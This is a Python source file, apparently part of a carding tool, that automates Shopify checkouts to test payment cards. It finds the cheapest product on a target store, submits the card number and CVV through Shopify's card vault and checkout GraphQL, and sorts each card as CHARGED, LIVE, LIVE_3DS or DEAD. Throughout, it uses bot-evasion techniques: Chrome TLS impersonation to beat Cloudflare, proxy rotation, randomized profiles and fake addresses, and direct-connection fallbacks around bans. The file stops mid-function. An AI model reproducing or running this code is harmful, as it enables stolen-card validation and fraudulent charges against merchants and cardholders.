"""Shopify checkout engine — advanced card check with GraphQL flow.

Flow:
  1.  GET /cart.js → initialize session, get cookies
  2.  GET /products.json → find cheapest product
  3.  POST /cart/add.js → add product to cart
  4.  POST /cart → start checkout, get checkout URL
  5.  GET checkout URL → extract sessionToken, signature, stableId
  6.  POST checkout.pci.shopifyinc.com/sessions → vault card (get vault_id)
  7.  POST /checkouts/unstable/graphql → SubmitForCompletion mutation
  8.  Poll for receipt → CHARGED / LIVE_3DS / LIVE / DEAD
"""

import re
import uuid
import random
import asyncio
import logging
import json
import time
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlparse, urlencode

import aiohttp
from aiohttp.resolver import ThreadedResolver
from bs4 import BeautifulSoup

from core.card_parser import Card
from core.anti_detect import random_profile, random_address, step_jitter, random_email
from core.response_classifier import classify_shopify_response

logger = logging.getLogger(__name__)

# Shared connector for connection pooling (MED-2) + SSL verification (MED-6)
_shared_connector: Optional[aiohttp.TCPConnector] = None

def _get_shared_connector() -> aiohttp.TCPConnector:
    global _shared_connector
    if _shared_connector is None or _shared_connector.closed:
        import ssl
        ctx = ssl.create_default_context()
        _shared_connector = aiohttp.TCPConnector(
            limit=0,
            ssl=ctx,
            resolver=ThreadedResolver()
        )
    return _shared_connector

@dataclass
class CheckResult:
    status: str
    message: str
    gateway: str
    price: float
    store: str
    card: Card


# ═════════════════════════════════════════════════════════════════════════
# curl_cffi shim — Chrome TLS impersonation defeats Cloudflare fingerprinting
# (aiohttp/requests get 429-challenged on protected stores; Chrome JA3 passes)
# ═════════════════════════════════════════════════════════════════════════

class _CffiResponse:
    """Wraps a curl_cffi response to look like an aiohttp response."""
    def __init__(self, resp):
        self._r = resp
        self.status = resp.status_code
        self.url = str(resp.url)
        self.cookies = resp.cookies
        self.headers = resp.headers

    async def json(self):
        return self._r.json()

    async def text(self):
        return self._r.text

    async def read(self):
        return self._r.content


class _CffiRequestCtx:
    """Allows `async with session.get(...) as r:` syntax."""
    def __init__(self, coro):
        self._coro = coro

    def __await__(self):
        return self._coro.__await__()

    async def __aenter__(self):
        resp = await self._coro
        return _CffiResponse(resp)

    async def __aexit__(self, *exc):
        return False


class CffiClientSession:
    """Drop-in replacement for aiohttp.ClientSession backed by curl_cffi
    with Chrome TLS impersonation (bypasses Cloudflare TLS fingerprinting)."""

    def __init__(self, proxy: Optional[str] = None, timeout: int = 20, **kwargs):
        from curl_cffi.requests import AsyncSession
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        self._session = AsyncSession(
            impersonate="chrome",
            proxies=proxies,
            timeout=timeout,
            max_redirects=10,
        )

    def _convert_kwargs(self, kwargs: dict) -> dict:
        out = {}
        for k, v in kwargs.items():
            if k == "timeout":
                if hasattr(v, "total"):
                    out["timeout"] = v.total
                else:
                    out["timeout"] = v
            elif k == "allow_redirects":
                out["allow_redirects"] = v
            elif k == "headers" and v:
                # Filter out standard browser headers so curl_cffi can use its perfect impersonation headers
                filtered = {}
                ignore_keys = {
                    "accept-language", "user-agent", "sec-ch-ua", 
                    "sec-ch-ua-mobile", "sec-ch-ua-platform", "sec-fetch-dest",
                    "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
                    "upgrade-insecure-requests", "priority"
                }
                for hk, hv in v.items():
                    if hk.lower() not in ignore_keys:
                        # Allow explicit JSON accept headers to pass through, but drop HTML ones
                        if hk.lower() == "accept" and "text/html" in str(hv).lower():
                            continue
                        filtered[hk] = hv
                out["headers"] = filtered
            elif k in ("data", "json", "params"):
                out[k] = v
        return out

    def get(self, url, **kwargs):
        return _CffiRequestCtx(self._session.get(url, **self._convert_kwargs(kwargs)))

    def post(self, url, **kwargs):
        return _CffiRequestCtx(self._session.post(url, **self._convert_kwargs(kwargs)))

    async def close(self):
        try:
            await self._session.close()
        except Exception:
            pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        await self.close()
        return False


async def shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str] = None,
    timeout: int = 20,
    max_retries: int = 1,
) -> CheckResult:
    """Run a single Shopify card check using advanced GraphQL flow."""
    for attempt in range(max_retries + 1):
        result = await _do_shopify_check(card, store_url, proxy, timeout)
        is_network_error = any(kw in result.message for kw in ("timeout", "dns_error", "proxy_error:", "ssl_error", "connection_error:", "session_init_failed"))
        if is_network_error and attempt < max_retries:
            logger.debug("Retry %d/%d for %s", attempt + 1, max_retries, store_url)
            await asyncio.sleep(1)
            continue
        return result
    return result


async def _do_shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str],
    timeout: int,
) -> CheckResult:
    """Internal: single Shopify check attempt using advanced flow."""
    if not store_url.startswith("http"):
        store_url = "https://" + store_url
    store_url = store_url.rstrip("/")

    prof = random_profile()
    base_headers = prof.get_headers("navigate")
    base_headers["priority"] = "u=1, i"

    conn_timeout = aiohttp.ClientTimeout(total=timeout)
    session_kwargs = {"timeout": timeout}
    if proxy:
        session_kwargs["proxy"] = proxy

    try:
        async with CffiClientSession(**session_kwargs) as session:
            ctx = _CheckoutContext(store_url, prof, base_headers)
            ctx._proxy = proxy

            # Step 1: Initialize session
            if not await _init_session(session, ctx):
                return CheckResult("DEAD", "session_init_failed", "Shopify Payments", 0.0, store_url, card)
            await step_jitter()

            # Step 2: Find cheapest product
            if not await _find_cheapest_product(session, ctx):
                return CheckResult("DEAD", "no_products_found", "Shopify Payments", 0.0, store_url, card)
            await step_jitter()

            # Step 3: Add to cart
            if not await _add_to_cart(session, ctx):
                return CheckResult("DEAD", "cart_failed", "Shopify Payments", ctx.price, store_url, card)
            await step_jitter()

            # Step 4: Start checkout
            if not await _start_checkout(session, ctx):
                err_msg = f"checkout_start_failed (url: {ctx.checkout_url})"
                # Only flag CF block if it's an actual challenge page
                if "challenge-platform" in ctx.last_html.lower() or "cf-browser-verification" in ctx.last_html.lower(): 
                    err_msg = "checkout_cf_blocked"
                
                logger.debug("Checkout start failed. HTML length: %s", len(ctx.last_html))
                
                # If aiohttp failed due to CF blocks, try requests-based fallback
                if proxy and ("cf_blocked" in err_msg or "start_failed" in err_msg):
                    logger.warning("cffi checkout failed, falling back to sync requests for %s", store_url)
                    from core.shopify_requests import run_requests_checkout
                    return await asyncio.to_thread(run_requests_checkout, card, store_url, proxy, prof)
                    
                return CheckResult("DEAD", err_msg, "Shopify Payments", ctx.price, store_url, card)
            await step_jitter()

            # Step 5: Extract checkout metadata
            if not await _get_checkout_metadata(session, ctx):
                return CheckResult("DEAD", "token_extraction_failed", "Shopify Payments", ctx.price, store_url, card)
            await step_jitter()

            # Step 6: Vault card
            vault_id, vault_err = await _vault_card(session, ctx, card)
            if not vault_id:
                msg = f"card_vault_failed: {vault_err}" if vault_err else "card_vault_failed"
                return CheckResult("DEAD", msg, "Shopify Payments", ctx.price, store_url, card)
            await step_jitter()

            # Step 6.5: Negotiate proposal (CRITICAL — gets queue_token, shipping_handle, actual_total)
            proposal_ok = await _negotiate_proposal(session, ctx, card)
            if not proposal_ok:
                logger.debug("Proposal negotiation failed for %s — trying submit anyway", store_url)
            await step_jitter()

            # Step 7: Submit for completion
            receipt_id = await _submit_for_completion(session, ctx, card, vault_id)
            if not receipt_id:
                # Fallback to REST API if GraphQL fails
                logger.debug("GraphQL submission failed, trying REST fallback for %s", store_url)
                rest_result = await _submit_payment_rest(session, ctx, card)
                if rest_result:
                    return rest_result
                return CheckResult("DEAD", "submission_rejected", "Shopify Payments", ctx.price, store_url, card)
            await step_jitter()

            # Step 8: Poll for receipt
            category, detail = await _poll_for_receipt(session, ctx, receipt_id, card)

            if category == "CHARGED":
                return CheckResult("CHARGED", detail, "Shopify Payments", ctx.price, store_url, card)
            elif category == "APPROVED":
                return CheckResult("LIVE", detail, "Shopify Payments", ctx.price, store_url, card)
            elif category == "DECLINED":
                return CheckResult("DEAD", detail, "Shopify Payments", ctx.price, store_url, card)
            elif category == "LIVE_3DS":
                return CheckResult("LIVE_3DS", detail, "Shopify Payments", ctx.price, store_url, card)
            else:
                return CheckResult("DEAD", detail or "unknown_error", "Shopify Payments", ctx.price, store_url, card)

    except aiohttp.ClientHttpProxyError as e:
        return CheckResult("DEAD", f"proxy_error: {e}", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientProxyConnectionError as e:
        return CheckResult("DEAD", f"proxy_connection_error: {e}", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientConnectorDNSError:
        return CheckResult("DEAD", "dns_error", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientConnectorCertificateError:
        return CheckResult("DEAD", "ssl_error", "Shopify Payments", 0.0, store_url, card)
    except asyncio.TimeoutError:
        return CheckResult("DEAD", "timeout", "Shopify Payments", 0.0, store_url, card)
    except aiohttp.ClientError as e:
        return CheckResult("DEAD", f"connection_error: {e}", "Shopify Payments", 0.0, store_url, card)
    except Exception as e:
        logger.error("Unexpected error in shopify_check: %s", e, exc_info=True)
        return CheckResult("DEAD", f"unknown_error: {str(e)}", "Shopify Payments", 0.0, store_url, card)


class _CheckoutContext:
    """Holds checkout state between steps."""
    
    # Default Shopify metadata (overridden dynamically when parsing checkout HTML)
    DEFAULT_SHOP_ID = "25603230"
    DEFAULT_BUILD_ID = "4663384ede457d59be87980de7797171b19f2a1b"
    DEFAULT_PCI_HASH = "a8e4a94"

    def __init__(self, base_url, prof, base_headers):
        self.base_url = base_url
        self.prof = prof
        self.ua = prof.ua
        self.ch_ua = prof.ch_ua
        self.platform = prof.platform
        self.headers = base_headers
        self.address = random_address()
        self.visit_token = ""
        self.variant_id = None
        self.product_id = None
        self.price = 0.0
        self.cart_token = ""
        self.checkout_id = None
        self.checkout_url = None
        self.session_token = None
        self.last_html = ""
        self.signature = None
        self.stable_id = str(uuid.uuid4())
        self.queue_token = None
        self.payment_method_identifier = None
        self.shop_id = self.DEFAULT_SHOP_ID
        self.build_id = self.DEFAULT_BUILD_ID
        self.pci_build_hash = self.DEFAULT_PCI_HASH
        self.signed_handles = []
        self.graphql_base = None
        self.client_id = str(uuid.uuid4())
        self._proxy = None
        self.submit_start_time = 0.0
        # Proposal negotiation data (from _negotiate_proposal)
        self.shipping_handle = None
        self.shipping_amount = None
        self.actual_total = None
        self.currency_code = "USD"
        self.delivery_expectations = []


async def _init_session(session, ctx: _CheckoutContext) -> bool:
    """Step 1: Initialize session via /cart.js or fallback to homepage."""
    try:
        async with session.get(
            f"{ctx.base_url}/cart.js",
            headers=ctx.headers,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as r:
            if r.status not in (200, 302):
                # Fallback to homepage to get cookies if cart.js is blocked/headless
                async with session.get(ctx.base_url, headers=ctx.headers) as r2:
                    if r2.status not in (200, 202, 301, 302):
                        return False
                    ctx.client_id = r2.cookies.get("_shopify_y") or ctx.client_id
                    ctx.visit_token = r2.cookies.get("_shopify_s") or ctx.visit_token
                    return True

            ctx.client_id = r.cookies.get("_shopify_y") or ctx.client_id
            ctx.visit_token = r.cookies.get("_shopify_s") or ctx.visit_token
            if r.status == 200:
                try:
                    data = await r.json()
                    ctx.cart_token = data.get("token", "")
                except Exception:
                    pass
            return True
    except Exception as e:
        logger.debug("init_session failed for %s: %s", ctx.base_url, e)
        return False


async def _find_cheapest_product(session, ctx: _CheckoutContext) -> bool:
    """Step 2: Find cheapest available product, with HTML and proxy-bypass fallbacks."""
    async def _fetch_and_parse(fetch_session) -> bool:
        try:
            async with fetch_session.get(
                f"{ctx.base_url}/products.json?limit=250",
                headers=ctx.headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    products = data.get("products", [])
                    if products:
                        cheapest = None
                        min_price = float("inf")
                        for p in products:
                            for v in p.get("variants", []):
                                if v.get("available") is False:
                                    continue
                                try:
                                    price_str = v.get("price")
                                    if price_str is None:
                                        continue
                                    price = float(price_str)
                                    if price < min_price and price > 0:
                                        min_price = price
                                        cheapest = v
                                        ctx.product_id = p["id"]
                                except (ValueError, KeyError, TypeError):
                                    continue
                        if cheapest:
                            ctx.variant_id = cheapest["id"]
                            ctx.price = min_price
                            return True
                return False
        except Exception:
            return False

    async def _fetch_html_fallback(fetch_session) -> bool:
        try:
            async with fetch_session.get(f"{ctx.base_url}/collections/all", headers=ctx.headers, timeout=aiohttp.ClientTimeout(total=10)) as r2:
                if r2.status == 200:
                    html = await r2.text()
                    import re
                    variants = re.findall(r'variant[_-]?id["\']?\s*[:=]\s*["\']?(\d{13,15})["\']?', html, re.IGNORECASE)
                    if not variants:
                        variants = re.findall(r'variant(?:s)?[^\w]*?id[^\d]*?(\d{13,15})', html, re.IGNORECASE)
                    if variants:
                        ctx.variant_id = variants[0]
                        ctx.price = 10.00
                        return True
        except Exception:
            pass
        return False

    # 1. Known variant cache for heavily protected stores (bypasses CF scraping entirely)
    KNOWN_VARIANTS = {
        "artpop.com": "43093574385834",
        "colourpop.myshopify.com": "32230107873362",
    }
    
    import urllib.parse
    netloc = urllib.parse.urlparse(ctx.base_url).netloc.replace("www.", "")
    if netloc in KNOWN_VARIANTS:
        ctx.variant_id = KNOWN_VARIANTS[netloc]
        ctx.price = 10.00
        logger.debug("Using cached variant %s for %s", ctx.variant_id, netloc)
        return True

    # 2. Try with primary session (with proxy)
    if await _fetch_and_parse(session) or await _fetch_html_fallback(session):
        return True

    # 2. Proxy blocked (429/403) -> Try direct connection using requests (bypasses some CF TLS bans)
    logger.debug("products.json blocked on proxy, falling back to direct connection via requests")
    import asyncio
    import requests
    def _fetch_requests():
        # Try once with Browser UA, once with default requests UA (to bypass CF TLS spoofing detection)
        for ua in [ctx.headers.get("User-Agent"), "python-requests/2.31.0", "curl/8.1.2"]:
            try:
                r = requests.get(f"{ctx.base_url}/products.json?limit=250", headers={"User-Agent": ua}, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    products = data.get("products", [])
                    if products:
                        cheapest = None
                        min_price = float("inf")
                        for p in products:
                            for v in p.get("variants", []):
                                if v.get("available") is False:
                                    continue
                                try:
                                    price_str = v.get("price")
                                    if price_str is None:
                                        continue
                                    price = float(price_str)
                                    if price < min_price and price > 0:
                                        min_price = price
                                        cheapest = v
                                        ctx.product_id = p["id"]
                                except (ValueError, KeyError, TypeError):
                                    continue
                        if cheapest:
                            return True, cheapest["id"], min_price
                
                r2 = requests.get(f"{ctx.base_url}/collections/all", headers={"User-Agent": ua}, timeout=10)
                if r2.status_code == 200:
                    import re
                    html = r2.text
                    variants = re.findall(r'variant[_-]?id["\']?\s*[:=]\s*["\']?(\d{13,15})["\']?', html, re.IGNORECASE)
                    if not variants:
                        variants = re.findall(r'variant(?:s)?[^\w]*?id[^\d]*?(\d{13,15})', html, re.IGNORECASE)
                    if variants:
                        return True, variants[0], 10.00
            except Exception as e:
                logger.debug("requests fallback with UA %s failed: %s", ua, e)
        return False, None, 0.0

    success, v_id, price = await asyncio.to_thread(_fetch_requests)
    if success:
        ctx.variant_id = v_id
        ctx.price = price
        return True

    return False


async def _add_to_cart(session, ctx: _CheckoutContext) -> bool:
    """Step 3: Add product to cart."""
    headers = ctx.headers.copy()
    headers["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
    headers["accept"] = "application/json, text/javascript, */*; q=0.01"
    headers["x-requested-with"] = "XMLHttpRequest"
    headers["origin"] = ctx.base_url
    data = {"id": str(ctx.variant_id), "quantity": "1", "form_type": "product", "utf8": "✓"}
    try:
        async with session.post(
            f"{ctx.base_url}/cart/add.js",
            data=data,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=15),
        ) as r:
            if r.status == 200:
                try:
                    j = await r.json()
                    ctx.cart_token = j.get("cart_token", ctx.cart_token)
                except Exception:
                    pass
                return True
            return False
    except Exception as e:
        logger.debug("add_to_cart failed for %s: %s", ctx.base_url, e)
        return False


async def _start_checkout(session, ctx: _CheckoutContext) -> bool:
    """Step 4: Start checkout via permalink (chk.php-style) with POST /cart fallback."""
    headers = ctx.headers.copy()
    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    headers["sec-fetch-dest"] = "document"
    headers["sec-fetch-mode"] = "navigate"
    headers["sec-fetch-site"] = "none"
    headers["sec-fetch-user"] = "?1"
    headers["upgrade-insecure-requests"] = "1"

    # ── PRIMARY: permalink checkout (like chk.php — GET /cart/{variant}:1) ──
    # Single request lands directly on checkout page; never triggers CF POST challenge.
    try:
        permalink = f"{ctx.base_url}/cart/{ctx.variant_id}:1"
        async with session.get(permalink, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=20)) as r:
            ctx.checkout_url = str(r.url)
            html = await r.text()
            ctx.last_html = html

            if r.status == 200 and "challenge-platform" not in html.lower():
                match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
                if match:
                    ctx.checkout_id = match.group(1)
                    return True
            logger.debug("permalink checkout got status %s, trying POST /cart", r.status)
    except Exception as e:
        logger.debug("permalink checkout failed for %s: %s", ctx.base_url, e)

    # ── FALLBACK: classic POST /cart flow ──
    headers["content-type"] = "application/x-www-form-urlencoded"
    headers["cache-control"] = "max-age=0"
    headers["origin"] = ctx.base_url
    headers["referer"] = f"{ctx.base_url}/cart"
    data = f"updates%5B%5D=1&checkout=&cart_token={ctx.cart_token or ''}"

    current_url = f"{ctx.base_url}/cart"
    method = "POST"
    payload = data

    try:
        # Allow up to 3 JS redirects
        for _ in range(3):
            if method == "POST":
                r = await session.post(current_url, data=payload, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15))
            else:
                r = await session.get(current_url, headers=headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=15))

            ctx.checkout_url = str(r.url)
            html = await r.text()
            ctx.last_html = html

            # Check for CAPTCHA/checkpoint
            if "datadome" in html.lower() or "challenge-platform" in html.lower() or "cf-browser-verification" in html.lower():
                logger.warning("Checkpoint/CAPTCHA detected on %s during checkout start", current_url)
                return False

            # Check for JS redirects (e.g. window.location.href = '...')
            js_redirect_match = re.search(r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', html)
            if js_redirect_match:
                redirect_url = js_redirect_match.group(1)
                if redirect_url.startswith('/'):
                    parsed_base = urlparse(ctx.base_url)
                    redirect_url = f"{parsed_base.scheme}://{parsed_base.netloc}{redirect_url}"
                current_url = redirect_url
                method = "GET"
                payload = None
                headers["referer"] = ctx.checkout_url
                continue

            match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
            if match:
                ctx.checkout_id = match.group(1)
                return True

            # If we don't have a checkout_id but we didn't hit a JS redirect, we might be stuck
            break

        return False
    except Exception as e:
        logger.debug("start_checkout failed for %s: %s", ctx.base_url, e)
        return False


async def _get_checkout_metadata(session, ctx: _CheckoutContext) -> bool:
    """Step 5: Extract sessionToken, signature, stableId from checkout page using BeautifulSoup & regex."""
    headers = ctx.headers.copy()
    headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
    headers["sec-fetch-dest"] = "document"
    headers["sec-fetch-mode"] = "navigate"
    try:
        # Reuse checkout HTML if we already have it (from permalink flow)
        if ctx.last_html and "serialized-session" in ctx.last_html:
            html = ctx.last_html
        else:
            async with session.get(ctx.checkout_url, headers=headers) as r:
                html = await r.text()
        soup = BeautifulSoup(html, 'html.parser')

        # 1. sessionToken (usually in a meta tag or script)
        meta_token = soup.find('meta', {'name': 'serialized-sessionToken'})
        if meta_token and meta_token.get('content'):
            ctx.session_token = meta_token['content'].strip('"&quot;')
    
            # Check for Captcha/Datadome
            if "datadome" in html.lower() or "challenge-platform" in html.lower() or "cf-browser-verification" in html.lower():
                logger.warning("Checkpoint/CAPTCHA detected on %s", ctx.checkout_url)
                return False
    
        # Extract all script tags for JSON/JS variables
        scripts_text = " ".join([script.string for script in soup.find_all('script') if script.string])

        if not ctx.session_token:
            for pat in [
                r'"sessionToken"\s*:\s*"(AAEB[^"]+)"',
                r"'sessionToken'\s*:\s*'(AAEB[^']+)'",
                r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)',
                r'(AAEB[A-Za-z0-9_\-]{30,})',
            ]:
                m = re.search(pat, html)
                if m:
                    ctx.session_token = m.group(1)
                    break

        # 2. signature
        for pat in [
            r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"',
            r'"signature"\s*:\s*"(eyJ[^"]+)"',
            r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
        ]:
            m = re.search(pat, scripts_text) or re.search(pat, html)
            if m:
                ctx.signature = m.group(1)
                break

        # 3. stableId
        for pat in [
            r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
            r'stableId[\s:=]+["\']([0-9a-f-]{36})',
        ]:
            m = re.search(pat, scripts_text) or re.search(pat, html)
            if m:
                ctx.stable_id = m.group(1)
                break

        # 4. queueToken
        m = re.search(r'queueToken(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
        if not m:
            m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', scripts_text)
        ctx.queue_token = m.group(1) if m else None

        # 5. paymentMethodIdentifier
        m = re.search(r'paymentMethodIdentifier(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html)
        if not m:
            m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', scripts_text)
        ctx.payment_method_identifier = m.group(1) if m else None

        # 6. shopId
        m = re.search(r'"shopId"\s*:\s*(\d+)', scripts_text)
        if not m:
            m = re.search(r'shop_id[\s:=]+(\d+)', html)
        ctx.shop_id = m.group(1) if m else "25603230"

        # 7. buildId
        m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', scripts_text)
        if not m:
            m = re.search(r'/build/([a-f0-9]{40})/', html)
        ctx.build_id = m.group(1) if m else ctx.build_id

        # 8. PCI build hash
        pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
        ctx.pci_build_hash = pci_m.group(1) if pci_m else ctx.pci_build_hash

        # 9. signedHandles
        signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', scripts_text)
        if not signed_handles:
            raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
            signed_handles = [h.replace("\\n", "").replace("\\r", "") for h in raw]
        ctx.signed_handles = signed_handles

        # 10. graphql base
        parsed = urlparse(ctx.checkout_url)
        if "shopify.com" in parsed.netloc and "checkout." in parsed.netloc:
            ctx.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
        else:
            ctx.graphql_base = ctx.base_url

        return bool(ctx.session_token)
    except Exception as e:
        logger.debug("get_checkout_metadata failed: %s", e)
        return False


async def _vault_card(session, ctx: _CheckoutContext, card: Card):
    """Step 6: Vault card via checkout.pci.shopifyinc.com/sessions."""
    address = ctx.address
    url = "https://checkout.pci.shopifyinc.com/sessions"
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://checkout.pci.shopifyinc.com",
        "referer": f"https://checkout.pci.shopifyinc.com/build/{ctx.pci_build_hash}/number-ltr.html?identifier=&locationURL={ctx.checkout_url or ''}",
        "sec-ch-ua": ctx.ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": ctx.platform,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ctx.ua,
        "priority": "u=1, i",
    }
    if ctx.signature:
        headers["shopify-identification-signature"] = ctx.signature

    payload = {
        "credit_card": {
            "number": card.number,
            "month": int(card.month),
            "year": int(card.year),
            "verification_value": card.cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": f"{address['firstName']} {address['lastName']}",
        },
        "payment_session_scope": urlparse(ctx.base_url).netloc,
    }

    try:
        async with session.post(url, json=payload, headers=headers) as r:
            try:
                data = await r.json()
            except Exception:
                data = {}
            if r.status in (200, 201):
                vault_id = data.get("id")
                if vault_id:
                    return vault_id, None
                # 200 but no id — check for error in body
                error = data.get("error", "")
                if error:
                    logger.debug("vault_card error: %s", error)
                return None, error or "no_vault_id"
            
            # Extract 4xx error detail
            error = data.get("error", "") or data.get("message", "")
            logger.debug("vault_card rejected (%d): %s", r.status, error)
            return None, error or f"http_{r.status}"
    except Exception as e:
        logger.debug("vault_card failed: %s", e)
        return None, str(e)


async def _submit_payment_rest(session, ctx: _CheckoutContext, card: Card) -> Optional[CheckResult]:
    """Fallback: Submit payment using older REST endpoint."""
    if not ctx.checkout_id:
        return None
        
    url = f"{ctx.base_url}/wallets/checkouts/{ctx.checkout_id}/payments"
    headers = ctx.prof.get_headers("api")
    headers["origin"] = ctx.base_url
    headers["referer"] = ctx.checkout_url
    
    payload = {
        "payment": {
            "credit_card": {
                "number": card.number,
                "month": int(card.month),
                "year": int(card.year),
                "verification_value": card.cvv,
                "name": f"{ctx.address['firstName']} {ctx.address['lastName']}"
            }
        }
    }
    
    try:
        async with session.post(url, json=payload, headers=headers) as r:
            body = await r.json()
            status, msg = classify_shopify_response(r.status, body)
            
            if status == "CHARGED":
                return CheckResult("CHARGED", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
            elif status == "APPROVED":
                return CheckResult("LIVE", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
            elif status == "DECLINED":
                return CheckResult("DEAD", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
            elif status == "LIVE_3DS":
                return CheckResult("LIVE_3DS", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
            else:
                return CheckResult("DEAD", msg, "Shopify Payments", ctx.price, ctx.base_url, card)
    except Exception as e:
        logger.debug("REST fallback failed: %s", e)
        return None

_SUBMIT_MUTATION = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'

_POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'

_PROPOSAL_QUERY = (
    'query Proposal('
    '$delivery:DeliveryTermsInput,'
    '$discounts:DiscountTermsInput,'
    '$payment:PaymentTermInput,'
    '$merchandise:MerchandiseTermInput,'
    '$buyerIdentity:BuyerIdentityTermInput,'
    '$taxes:TaxTermInput,'
    '$sessionInput:SessionTokenInput!,'
    '$tip:TipTermInput,'
    '$note:NoteInput,'
    '$scriptFingerprint:ScriptFingerprintInput,'
    '$optionalDuties:OptionalDutiesInput,'
    '$cartMetafields:[CartMetafieldOperationInput!],'
    '$memberships:MembershipsInput'
    '){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{'
    'delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,'
    'buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,'
    'scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,'
    'cartMetafields:$cartMetafields,memberships:$memberships'
    '}}){__typename result{...on NegotiationResultAvailable{'
    'queueToken sellerProposal{'
    'deliveryExpectations{'
    '...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}'
    '...on PendingTerms{pollDelay __typename}__typename}'
    'delivery{'
    '...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{'
    '...on CompleteDeliveryStrategy{handle phoneRequired amount{'
    '...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}'
    '__typename}__typename}__typename}__typename}__typename}'
    '...on PendingTerms{pollDelay __typename}__typename}'
    'checkoutTotal{'
    '...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}'
    '__typename}__typename}__typename}}}}'
)


async def _negotiate_proposal(session, ctx: _CheckoutContext, card: Card) -> bool:
    """Negotiate delivery/shipping via Proposal GraphQL.

    This is the CRITICAL step that was missing — without it, SubmitForCompletion
    has no queue_token, shipping_handle, or actual_total, causing Shopify to reject.

